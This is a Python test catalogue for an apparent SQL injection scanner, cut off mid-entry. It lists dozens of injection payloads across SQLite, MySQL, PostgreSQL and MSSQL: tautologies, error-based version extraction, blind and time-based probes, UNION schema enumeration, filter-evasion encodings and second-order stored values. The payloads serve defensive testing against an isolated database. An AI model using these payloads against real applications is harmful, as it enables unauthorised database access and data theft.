"""Test case catalogue, grouped by vulnerability category.

All payloads target the isolated test database only.
Baseline and control payloads are used for comparison.

Subcategory taxonomy
---------------------
VulnCategory has 6 top-level buckets. The brief's 18 finer attack classes
are carried in TestCase.subcategory (free text, see models.SUBCATEGORIES)
and mapped onto the 6 buckets as follows:

    CLASSIC        -> tautology, quote_delimiter, comment_based,
                       conditional_expression, like_based, stacked_query
    BOOLEAN_BLIND   -> boolean_based, comparison_operator, type_conversion,
                       null_based
    ERROR_BASED     -> error_based
    UNION_BASED     -> union_based, metadata_exposure, numeric (where the
                       numeric variant is a UNION column-count/type probe)
    TIME_BLIND      -> time_blind
    SECOND_ORDER    -> second_order

Encoding-based variations are not a standalone bucket: they are a
transformation applied to payloads in other classes, so each encoded case
keeps the subcategory of what it is encoding and additionally notes the
encoding scheme in its description.

Database compatibility
-----------------------
TestCase.db_compat lists the engines a payload is meaningful against:
"sqlite", "mysql", "postgresql", "mssql", or "generic" (plain SQL with no
engine-specific syntax, expected to behave the same everywhere a '=' or
quote can reach the query string).

Do not assume a payload valid on one engine works on another — e.g.
SLEEP() is MySQL-only, pg_sleep() is PostgreSQL-only, WAITFOR DELAY is
MSSQL-only, and SQLite has no native sleep function at all (its time-based
tests are marked inconclusive-by-design; see TIME_BLIND section below).
"""

from models import SecondOrderStage, TestCase, VulnCategory

BASELINE_PAYLOAD = "1"

TEST_CASES: list[TestCase] = [

    # =========================================================================
    # ORIGINAL TEST CASES — UNCHANGED (ids, payloads, fields all preserved)
    # =========================================================================

    # --- Classic / tautology-based -------------------------------------------

    TestCase(
        test_id="classic_01",
        category=VulnCategory.CLASSIC,
        payload="1' OR '1'='1",
        control_payload="1' OR '1'='2",
        description="Classic string-based tautology injection.",
    ),

    TestCase(
        test_id="classic_02",
        category=VulnCategory.CLASSIC,
        payload="1 OR 1=1",
        control_payload="1 OR 1=2",
        description="Numeric tautology injection. May not apply to quoted input contexts.",
    ),

    TestCase(
        test_id="classic_03",
        category=VulnCategory.CLASSIC,
        payload="1' OR 1=1-- ",
        control_payload="1' OR 1=2-- ",
        description="OR-based tautology using SQL line comments.",
    ),

    TestCase(
        test_id="classic_04",
        category=VulnCategory.CLASSIC,
        payload="1' AND 1=1-- ",
        control_payload="1' AND 1=2-- ",
        description="AND-based true and false condition comparison.",
    ),

    TestCase(
        test_id="classic_05",
        category=VulnCategory.CLASSIC,
        payload="1' OR 'a'='a",
        control_payload="1' OR 'a'='b",
        description="String comparison-based tautology.",
    ),

    TestCase(
        test_id="classic_06",
        category=VulnCategory.CLASSIC,
        payload="1' OR 2>1-- ",
        control_payload="1' OR 2<1-- ",
        description="Comparison-operator-based tautology.",
    ),

    TestCase(
        test_id="classic_07",
        category=VulnCategory.CLASSIC,
        payload="1' OR 'x' LIKE 'x",
        control_payload="1' OR 'x' LIKE 'y",
        description="LIKE operator-based Boolean condition.",
    ),

    TestCase(
        test_id="classic_08",
        category=VulnCategory.CLASSIC,
        payload="1' OR '1'='1' /*",
        control_payload="1' OR '1'='2' /*",
        description="Tautology using a block comment to consume the remaining query.",
    ),

    # --- Error-based ---------------------------------------------------------

    TestCase(
        test_id="error_01",
        category=VulnCategory.ERROR_BASED,
        payload="1'",
        description="Single unescaped quote to trigger a SQL syntax error.",
    ),

    TestCase(
        test_id="error_02",
        category=VulnCategory.ERROR_BASED,
        payload='1")',
        description="Mismatched quote and parenthesis.",
    ),

    # --- Boolean-based blind -------------------------------------------------

    TestCase(
        test_id="bool_01",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND '1'='1",
        control_payload="1' AND '1'='2",
        description="True versus false Boolean condition.",
    ),

    # --- Time-based blind ----------------------------------------------------

    TestCase(
        test_id="time_01",
        category=VulnCategory.TIME_BLIND,
        payload="1' AND <VERIFIED_DELAY_FUNCTION_PENDING>--",
        description="Placeholder time-based probe. Requires a verified "
                    "database-specific delay function.",
    ),

    # --- UNION-based ---------------------------------------------------------

    TestCase(
        test_id="union_01",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT name, sql FROM sqlite_master--",
        description="SQLite schema metadata retrieval test.",
    ),

    # --- Second-order --------------------------------------------------------

    TestCase(
        test_id="second_order_01",
        category=VulnCategory.SECOND_ORDER,
        payload="o'brien' OR '1'='1",
        description="Stored payload requiring a separate read-back operation.",
        second_order=SecondOrderStage(
            store_payload="o'brien' OR '1'='1",
            read_operation="list_profiles_after_store",
            implemented=False,
        ),
    ),

    # =========================================================================
    # NEW TEST CASES
    # =========================================================================

    # -------------------------------------------------------------------------
    # CLASSIC / tautology (additional)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_taut_09",
        category=VulnCategory.CLASSIC,
        payload='1" OR "1"="1',
        control_payload='1" OR "1"="2',
        description="Double-quote variant of the string tautology, for inputs reflected inside double-quoted literals.",
        subcategory="tautology",
        db_compat=["mysql", "sqlite"],
    ),

    TestCase(
        test_id="classic_taut_10",
        category=VulnCategory.CLASSIC,
        payload="1' OR 1 BETWEEN 0 AND 2-- ",
        control_payload="1' OR 1 BETWEEN 5 AND 9-- ",
        description="Tautology via BETWEEN range rather than direct equality.",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_taut_11",
        category=VulnCategory.CLASSIC,
        payload="1' OR EXISTS(SELECT 1)-- ",
        control_payload="1' OR EXISTS(SELECT 1 WHERE 1=0)-- ",
        description="Tautology using an always-true/always-false EXISTS subquery rather than a literal comparison.",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    # -------------------------------------------------------------------------
    # CLASSIC / quote and delimiter variations
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_quote_12",
        category=VulnCategory.CLASSIC,
        payload="1\\' OR \\'1\\'=\\'1",
        description="Backslash-escaped quote variant, probing whether the app's own escaping (not the DB driver's) is what's relied on.",
        subcategory="quote_delimiter",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="classic_quote_13",
        category=VulnCategory.CLASSIC,
        payload="1'' OR ''1''=''1",
        description="Doubled single-quote (SQL-standard quote escaping) used as the delimiter break instead of a backslash.",
        subcategory="quote_delimiter",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_quote_14",
        category=VulnCategory.CLASSIC,
        payload="1`) OR (`1`=`1",
        description="Backtick identifier-delimiter variant; only meaningful where input lands in an identifier position.",
        subcategory="quote_delimiter",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="classic_quote_15",
        category=VulnCategory.CLASSIC,
        payload="1] OR [1]=[1",
        description="Square-bracket identifier-delimiter variant specific to MSSQL's bracketed identifiers.",
        subcategory="quote_delimiter",
        db_compat=["mssql"],
    ),

    TestCase(
        test_id="classic_quote_16",
        category=VulnCategory.CLASSIC,
        payload='1" OR "" = "',
        description="Unbalanced double-quote with an empty-string self-comparison, testing a different truncation point than classic_09.",
        subcategory="quote_delimiter",
        db_compat=["mysql", "sqlite"],
    ),

    # -------------------------------------------------------------------------
    # CLASSIC / comment-based
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_comment_17",
        category=VulnCategory.CLASSIC,
        payload="1' OR '1'='1'#",
        control_payload="1' OR '1'='2'#",
        description="MySQL single-line hash comment used to truncate the remainder of the query.",
        subcategory="comment_based",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="classic_comment_18",
        category=VulnCategory.CLASSIC,
        payload="1'/**/OR/**/'1'='1",
        control_payload="1'/**/OR/**/'1'='2",
        description="Inline block comments used as whitespace substitutes to evade naive keyword/space filtering.",
        subcategory="comment_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_comment_19",
        category=VulnCategory.CLASSIC,
        payload="1'-- -",
        description="Double-hyphen comment requiring a trailing space/char per some SQL dialects' comment syntax.",
        subcategory="comment_based",
        db_compat=["postgresql", "mssql"],
    ),

    TestCase(
        test_id="classic_comment_20",
        category=VulnCategory.CLASSIC,
        payload="1' OR/*comment*/'1'='1",
        control_payload="1' OR/*comment*/'1'='2",
        description="Block comment placed directly adjacent to a keyword, no surrounding spaces.",
        subcategory="comment_based",
        db_compat=["mysql", "postgresql"],
    ),

    # -------------------------------------------------------------------------
    # CLASSIC / conditional expression injection
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_cond_21",
        category=VulnCategory.CLASSIC,
        payload="1' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1-- ",
        control_payload="1' OR CASE WHEN 1=2 THEN 1 ELSE 0 END=1-- ",
        description="CASE expression used in place of a bare OR condition, testing conditional-expression handling.",
        subcategory="conditional_expression",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_cond_22",
        category=VulnCategory.CLASSIC,
        payload="1' OR IIF(1=1,1,0)=1-- ",
        control_payload="1' OR IIF(1=2,1,0)=1-- ",
        description="IIF() conditional expression, MSSQL/SQLite shorthand for CASE WHEN.",
        subcategory="conditional_expression",
        db_compat=["mssql", "sqlite"],
    ),

    TestCase(
        test_id="classic_cond_23",
        category=VulnCategory.CLASSIC,
        payload="1' OR IF(1=1,1,0)=1-- ",
        control_payload="1' OR IF(1=2,1,0)=1-- ",
        description="MySQL IF() conditional-expression function used as the true/false switch.",
        subcategory="conditional_expression",
        db_compat=["mysql"],
    ),

    # -------------------------------------------------------------------------
    # CLASSIC / LIKE-operator-based (additional, beyond classic_07)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_like_24",
        category=VulnCategory.CLASSIC,
        payload="1' OR 'anything' LIKE '%'-- ",
        control_payload="1' OR 'anything' LIKE 'nomatch%%'-- ",
        description="LIKE wildcard-percent match-all condition, distinct from classic_07's literal LIKE match.",
        subcategory="like_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_like_25",
        category=VulnCategory.CLASSIC,
        payload="1' OR 'x' NOT LIKE 'y'-- ",
        control_payload="1' OR 'x' NOT LIKE 'x'-- ",
        description="NOT LIKE as the inverse Boolean channel, to check the app distinguishes LIKE from NOT LIKE rather than just 'contains LIKE'.",
        subcategory="like_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_like_26",
        category=VulnCategory.CLASSIC,
        payload="1' OR 'x' LIKE '_'-- ",
        control_payload="1' OR 'xy' LIKE '_'-- ",
        description="Single-character LIKE wildcard (underscore) matching, distinct wildcard class from percent-based tests.",
        subcategory="like_based",
        db_compat=["generic"],
    ),

    # -------------------------------------------------------------------------
    # CLASSIC / stacked query detection
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_stack_27",
        category=VulnCategory.CLASSIC,
        payload="1'; SELECT 1-- ",
        description="Stacked no-op SELECT after a statement terminator. Requires the target DB driver/API to support "
                    "multi-statement execution — confirm this before relying on stacked-query results; many "
                    "drivers (including typical sqlite3 single-statement execute() calls) reject or ignore the "
                    "second statement, which is a negative result, not evidence of safety.",
        subcategory="stacked_query",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_stack_28",
        category=VulnCategory.CLASSIC,
        payload="1'; SELECT sqlite_version()-- ",
        description="SQLite-specific stacked query probing version metadata via a second statement.",
        subcategory="stacked_query",
        db_compat=["sqlite"],
    ),

    TestCase(
        test_id="classic_stack_29",
        category=VulnCategory.CLASSIC,
        payload="1'; WAITFOR DELAY '0:0:0'-- ",
        description="Stacked no-delay WAITFOR used purely to test whether a second statement executes at all on "
                    "MSSQL, before attempting any timing-based stacked test.",
        subcategory="stacked_query",
        db_compat=["mssql"],
    ),

    # -------------------------------------------------------------------------
    # ERROR-BASED (additional)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="error_03",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND extractvalue(1, concat(0x7e, version()))-- ",
        description="MySQL XPath-error-based extraction via extractvalue(), forces an error containing version() output.",
        subcategory="error_based",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="error_04",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND CAST((SELECT version()) AS int)-- ",
        description="PostgreSQL type-cast error, coercing text output into int to surface it in the error message.",
        subcategory="error_based",
        db_compat=["postgresql"],
    ),

    TestCase(
        test_id="error_05",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND 1=CONVERT(int, (SELECT @@version))-- ",
        description="MSSQL CONVERT() type-mismatch error, surfacing @@version in the resulting error text.",
        subcategory="error_based",
        db_compat=["mssql"],
    ),

    TestCase(
        test_id="error_06",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND 1=CAST('x' AS INTEGER)-- ",
        description="SQLite CAST-based type error; SQLite's CAST is lenient (often returns 0 rather than erroring), "
                    "so a non-error result here is expected and should not be scored as a false negative.",
        subcategory="error_based",
        db_compat=["sqlite"],
    ),

    TestCase(
        test_id="error_07",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND updatexml(1, concat(0x7e, version()), 1)-- ",
        description="MySQL XPath error via updatexml(), an alternate extraction function to extractvalue() in case one is filtered.",
        subcategory="error_based",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="error_08",
        category=VulnCategory.ERROR_BASED,
        payload="1' AND 1=(SELECT 1 FROM nonexistent_table_xyz)-- ",
        description="Unqualified reference to a table that should not exist, used as a generic schema-error trigger not tied to a specific function.",
        subcategory="error_based",
        db_compat=["generic"],
    ),

    # -------------------------------------------------------------------------
    # BOOLEAN-BASED / true-false pairs (additional, beyond bool_01)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="bool_02",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND 1=1-- ",
        control_payload="1' AND 1=0-- ",
        description="Numeric-literal Boolean pair, distinct code path from bool_01's string-literal comparison.",
        subcategory="boolean_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_03",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND LENGTH('a')=1-- ",
        control_payload="1' AND LENGTH('a')=2-- ",
        description="Boolean pair gated on a function result (LENGTH) rather than a literal, probing whether function calls reach the engine.",
        subcategory="boolean_based",
        db_compat=["mysql", "postgresql", "sqlite"],
    ),

    TestCase(
        test_id="bool_04",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND LEN('a')=1-- ",
        control_payload="1' AND LEN('a')=2-- ",
        description="MSSQL LEN() variant of the function-gated Boolean pair (MSSQL has no LENGTH()).",
        subcategory="boolean_based",
        db_compat=["mssql"],
    ),

    TestCase(
        test_id="bool_05",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND SUBSTRING('abc',1,1)='a'-- ",
        control_payload="1' AND SUBSTRING('abc',1,1)='b'-- ",
        description="Character-extraction Boolean pair via SUBSTRING, the core primitive used in real blind-exfiltration attacks.",
        subcategory="boolean_based",
        db_compat=["mysql", "mssql", "postgresql"],
    ),

    TestCase(
        test_id="bool_06",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND SUBSTR('abc',1,1)='a'-- ",
        control_payload="1' AND SUBSTR('abc',1,1)='b'-- ",
        description="SQLite/PostgreSQL SUBSTR() spelling of the character-extraction Boolean pair.",
        subcategory="boolean_based",
        db_compat=["sqlite", "postgresql"],
    ),

    # -------------------------------------------------------------------------
    # BOOLEAN-BASED / comparison-operator injection
    # -------------------------------------------------------------------------

    TestCase(
        test_id="bool_cmp_07",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND 2>=2-- ",
        control_payload="1' AND 2>=3-- ",
        description="Greater-than-or-equal operator Boolean pair.",
        subcategory="comparison_operator",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_cmp_08",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND 2<=2-- ",
        control_payload="1' AND 2<=1-- ",
        description="Less-than-or-equal operator Boolean pair.",
        subcategory="comparison_operator",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_cmp_09",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND 2!=3-- ",
        control_payload="1' AND 2!=2-- ",
        description="Not-equal (!=) operator Boolean pair.",
        subcategory="comparison_operator",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_cmp_10",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND 2<>3-- ",
        control_payload="1' AND 2<>2-- ",
        description="ANSI-standard not-equal (<>) operator Boolean pair, a distinct token from the C-style != above.",
        subcategory="comparison_operator",
        db_compat=["generic"],
    ),

    # -------------------------------------------------------------------------
    # BOOLEAN-BASED / NULL-based injection
    # -------------------------------------------------------------------------

    TestCase(
        test_id="bool_null_11",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' OR NULL IS NULL-- ",
        control_payload="1' OR 1 IS NULL-- ",
        description="NULL-based tautology using IS NULL, where the control uses a non-null literal to force false.",
        subcategory="null_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_null_12",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' OR 1=1 OR NULL-- ",
        description="Trailing bare NULL after a tautology, testing how three-valued (NULL) logic combines with OR in the target's query builder.",
        subcategory="null_based",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="bool_null_13",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND COALESCE(NULL,1)=1-- ",
        control_payload="1' AND COALESCE(NULL,2)=1-- ",
        description="COALESCE-based Boolean pair, verifying NULL-coalescing function calls reach the engine.",
        subcategory="null_based",
        db_compat=["mysql", "postgresql", "sqlite", "mssql"],
    ),

    TestCase(
        test_id="bool_null_14",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND ISNULL(NULL,1)=1-- ",
        control_payload="1' AND ISNULL(NULL,2)=1-- ",
        description="MSSQL ISNULL() two-argument variant of the NULL-coalescing Boolean pair.",
        subcategory="null_based",
        db_compat=["mssql"],
    ),

    # -------------------------------------------------------------------------
    # BOOLEAN-BASED / type conversion and casting
    # -------------------------------------------------------------------------

    TestCase(
        test_id="bool_cast_15",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND CAST(1 AS CHAR)='1'-- ",
        control_payload="1' AND CAST(1 AS CHAR)='2'-- ",
        description="Numeric-to-string CAST Boolean pair, standard ANSI CAST syntax.",
        subcategory="type_conversion",
        db_compat=["mysql", "postgresql", "mssql"],
    ),

    TestCase(
        test_id="bool_cast_16",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND CAST('1' AS INTEGER)=1-- ",
        control_payload="1' AND CAST('1' AS INTEGER)=2-- ",
        description="String-to-integer CAST Boolean pair, SQLite's permissive INTEGER affinity.",
        subcategory="type_conversion",
        db_compat=["sqlite"],
    ),

    TestCase(
        test_id="bool_cast_17",
        category=VulnCategory.BOOLEAN_BLIND,
        payload="1' AND '1'::int=1-- ",
        control_payload="1' AND '1'::int=2-- ",
        description="PostgreSQL double-colon cast shorthand, a dialect-specific alternative to CAST(...AS...).",
        subcategory="type_conversion",
        db_compat=["postgresql"],
    ),

    # -------------------------------------------------------------------------
    # TIME-BASED BLIND (additional, each explicit about its engine requirement)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="time_mysql_02",
        category=VulnCategory.TIME_BLIND,
        payload="1' AND SLEEP(0)-- ",
        description="MySQL SLEEP(0) zero-delay dry run: confirms the function call reaches the engine before using a "
                    "real delay value, so a timing measurement can't be confused with a syntax-error short-circuit.",
        subcategory="time_blind",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="time_pg_03",
        category=VulnCategory.TIME_BLIND,
        payload="1' AND pg_sleep(0)-- ",
        description="PostgreSQL pg_sleep(0) zero-delay dry run, same rationale as time_mysql_02 for the PG-specific function name.",
        subcategory="time_blind",
        db_compat=["postgresql"],
    ),

    TestCase(
        test_id="time_mssql_04",
        category=VulnCategory.TIME_BLIND,
        payload="1' WAITFOR DELAY '0:0:0'-- ",
        description="MSSQL WAITFOR DELAY zero-duration dry run. Note WAITFOR is a statement, not a function — it "
                    "typically requires stacked-query support to reach from an expression context; verify the "
                    "injection point allows a new statement before relying on this.",
        subcategory="time_blind",
        db_compat=["mssql"],
    ),

    TestCase(
        test_id="time_sqlite_05",
        category=VulnCategory.TIME_BLIND,
        payload="1' AND (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2, sqlite_master AS t3)>0-- ",
        description="SQLite has no native sleep/delay function. This substitutes a heavy cartesian-join query as an "
                    "indirect timing probe. Mark results INCONCLUSIVE rather than CONFIRMED: timing here is a proxy "
                    "for computational cost, not a verified delay primitive, and is sensitive to table size and "
                    "machine load. Do not invent or assume a SQLite sleep() equivalent.",
        subcategory="time_blind",
        db_compat=["sqlite"],
    ),

    TestCase(
        test_id="time_mysql_06",
        category=VulnCategory.TIME_BLIND,
        payload="1' AND IF(1=1,SLEEP(0),0)-- ",
        description="Conditional MySQL SLEEP dry run via IF(), to confirm the delay only fires on the true branch before timing a real condition.",
        subcategory="time_blind",
        db_compat=["mysql"],
    ),

    # -------------------------------------------------------------------------
    # UNION-BASED (additional, beyond union_01)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="union_colcount_02",
        category=VulnCategory.UNION_BASED,
        payload="1' ORDER BY 1-- ",
        description="Column-count probe step 1 of 2 via ORDER BY; intended to be run with increasing column indices "
                    "until an error occurs, to determine the target query's column count before a real UNION.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="union_colcount_03",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT NULL-- ",
        description="Single-column UNION probe using NULL, which is type-agnostic across all four target engines and "
                    "so won't itself fail on a type mismatch — isolates whether column *count* (not type) is the blocker.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="union_colcount_04",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT NULL, NULL-- ",
        description="Two-column UNION probe, next step after union_colcount_03 in the column-count determination sequence.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="union_meta_05",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT table_name, NULL FROM information_schema.tables-- ",
        description="information_schema table-name enumeration — the ANSI-standard metadata view available on MySQL, "
                    "PostgreSQL and MSSQL (not SQLite, which uses sqlite_master instead; see union_01).",
        subcategory="metadata_exposure",
        db_compat=["mysql", "postgresql", "mssql"],
    ),

    TestCase(
        test_id="union_meta_06",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- ",
        description="information_schema column-name enumeration for a specific table, the step after table enumeration in a real schema-mapping attack.",
        subcategory="metadata_exposure",
        db_compat=["mysql", "postgresql", "mssql"],
    ),

    TestCase(
        test_id="union_meta_07",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT @@version, NULL-- ",
        description="MySQL/MSSQL @@version system variable exposure via UNION — confirms version-string disclosure distinct from the schema-name disclosure above.",
        subcategory="metadata_exposure",
        db_compat=["mysql", "mssql"],
    ),

    TestCase(
        test_id="union_meta_08",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT version(), NULL-- ",
        description="PostgreSQL/SQLite version() function-call form of version disclosure (different syntax from the @@version system variable above).",
        subcategory="metadata_exposure",
        db_compat=["postgresql", "sqlite"],
    ),

    TestCase(
        test_id="union_meta_09",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT current_database(), NULL-- ",
        description="PostgreSQL current-database-name disclosure, a different metadata surface than version or schema.",
        subcategory="metadata_exposure",
        db_compat=["postgresql"],
    ),

    TestCase(
        test_id="union_meta_10",
        category=VulnCategory.UNION_BASED,
        payload="1' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'-- ",
        description="SQLite table-name-only enumeration (filtered to type='table'), a narrower variant of union_01's full sqlite_master dump.",
        subcategory="metadata_exposure",
        db_compat=["sqlite"],
    ),

    # -------------------------------------------------------------------------
    # ENCODING-BASED VARIATIONS
    # (each tagged with the subcategory of the thing being encoded, plus the
    #  encoding scheme noted in the description — see module docstring)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="enc_url_01",
        category=VulnCategory.CLASSIC,
        payload="1%27%20OR%20%271%27%3D%271",
        control_payload="1%27%20OR%20%271%27%3D%272",
        description="URL-encoded form of the classic_01 string tautology, testing whether the app decodes input "
                    "before use (encoding scheme: percent/URL encoding).",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="enc_dblurl_02",
        category=VulnCategory.CLASSIC,
        payload="1%2527%20OR%20%25271%2527%253D%25271",
        description="Double URL-encoded tautology, testing resilience against a single decode pass versus a double-decode layer (encoding scheme: double percent/URL encoding).",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="enc_unicode_03",
        category=VulnCategory.CLASSIC,
        payload="1\u02b9 OR \u02b91\u02b9=\u02b91",
        description="Unicode modifier-letter-apostrophe (U+02B9) substituted for ASCII single-quote, testing "
                    "whether lookalike-character normalization turns this into a real quote break "
                    "(encoding scheme: Unicode homoglyph substitution).",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="enc_hex_04",
        category=VulnCategory.CLASSIC,
        payload="1' OR 1=0x31-- ",
        control_payload="1' OR 1=0x32-- ",
        description="Hex-literal numeric encoding (0x31 = ASCII '1' = decimal 49... here used as the numeric literal "
                    "1 as MySQL implicitly converts 0x31 in numeric context) in place of a decimal literal "
                    "(encoding scheme: hexadecimal numeric literal).",
        subcategory="numeric",
        db_compat=["mysql"],
    ),

    TestCase(
        test_id="enc_char_05",
        category=VulnCategory.CLASSIC,
        payload="1' OR CHAR(49)=CHAR(49)-- ",
        control_payload="1' OR CHAR(49)=CHAR(50)-- ",
        description="CHAR()-encoded character comparison avoiding literal quote characters inside the comparison itself (encoding scheme: CHAR()/codepoint encoding).",
        subcategory="tautology",
        db_compat=["mysql", "mssql"],
    ),

    TestCase(
        test_id="enc_comment_06",
        category=VulnCategory.CLASSIC,
        payload="1'/**/OR/**/1=1-- ",
        control_payload="1'/**/OR/**/1=2-- ",
        description="Inline-comment-as-space encoding reused here specifically as a space-character evasion test for WAF/filter bypass analysis, distinct from classic_comment_18's general comment-based category entry.",
        subcategory="encoding",
        db_compat=["mysql", "postgresql"],
    ),

    # -------------------------------------------------------------------------
    # NUMERIC-BASED INJECTION (unquoted numeric contexts)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="numeric_01",
        category=VulnCategory.CLASSIC,
        payload="1 AND 1=1",
        control_payload="1 AND 1=2",
        description="Unquoted numeric-context Boolean pair — no leading quote, for inputs placed directly into a numeric column comparison.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="numeric_02",
        category=VulnCategory.CLASSIC,
        payload="1+1",
        description="Arithmetic-expression probe in a numeric context: a non-injected app returns id=1, an "
                    "injected one may evaluate the expression (id=2) or error — distinguishes string-concatenation "
                    "handling from raw numeric evaluation.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="numeric_03",
        category=VulnCategory.CLASSIC,
        payload="-1 OR 1=1",
        control_payload="-1 OR 1=2",
        description="Negative-literal-prefixed tautology, probing whether a leading sign character disrupts unquoted numeric parsing differently than classic_02.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="numeric_04",
        category=VulnCategory.CLASSIC,
        payload="1e0 OR 1=1",
        control_payload="1e0 OR 1=2",
        description="Scientific-notation numeric literal (1e0) as the base value, testing float-literal parsing in an unquoted numeric injection context.",
        subcategory="numeric",
        db_compat=["generic"],
    ),

    # -------------------------------------------------------------------------
    # SECOND-ORDER (additional, each with its own distinct store/read pairing)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="second_order_02",
        category=VulnCategory.SECOND_ORDER,
        payload="admin'-- ",
        description="Stored username-style payload designed to comment out the rest of a query when later read back "
                    "into an authentication or lookup query (e.g. a password check appended after the username).",
        subcategory="second_order",
        db_compat=["generic"],
        second_order=SecondOrderStage(
            store_payload="admin'-- ",
            read_operation="authenticate_user_after_store",
            implemented=False,
        ),
    ),

    TestCase(
        test_id="second_order_03",
        category=VulnCategory.SECOND_ORDER,
        payload="x' UNION SELECT name, sql FROM sqlite_master-- ",
        description="Stored UNION-based payload, exercising second-order UNION injection distinct from the "
                    "Boolean-tautology pattern in second_order_01 — requires the read-back query to itself be "
                    "vulnerable to UNION injection of the stored value, not just string concatenation.",
        subcategory="second_order",
        db_compat=["sqlite"],
        second_order=SecondOrderStage(
            store_payload="x' UNION SELECT name, sql FROM sqlite_master-- ",
            read_operation="render_profile_bio_after_store",
            implemented=False,
        ),
    ),

    TestCase(
        test_id="second_order_04",
        category=VulnCategory.SECOND_ORDER,
        payload="o''brien",
        description="Stored value containing a SQL-escaped quote (doubled single-quote) that is valid as *stored* "
                    "data but may be mishandled differently when the app re-reads and re-embeds it into a new query "
                    "— tests double-escaping/unescaping bugs distinct from second_order_01's raw-quote payload.",
        subcategory="second_order",
        db_compat=["generic"],
        second_order=SecondOrderStage(
            store_payload="o''brien",
            read_operation="list_profiles_after_store",
            implemented=False,
        ),
    ),

    # -------------------------------------------------------------------------
    # Cross-category: additional ERROR_BASED/BOOLEAN_BLIND coverage for
    # delimiter contexts not covered above (numeric-in-parens, as seen in
    # e.g. `WHERE id=(1)` style queries)
    # -------------------------------------------------------------------------

    TestCase(
        test_id="classic_paren_30",
        category=VulnCategory.CLASSIC,
        payload="1) OR (1=1",
        control_payload="1) OR (1=2",
        description="Parenthesis-delimiter tautology, for inputs reflected inside a parenthesized numeric comparison e.g. WHERE id=(INPUT).",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="classic_paren_31",
        category=VulnCategory.CLASSIC,
        payload="1') OR ('1'='1",
        control_payload="1') OR ('1'='2",
        description="Combined quote-and-parenthesis delimiter break, for inputs inside a parenthesized string comparison.",
        subcategory="tautology",
        db_compat=["generic"],
    ),

    TestCase(
        test_id="error_paren_09",
        category=VulnCategory.ERROR_BASED,
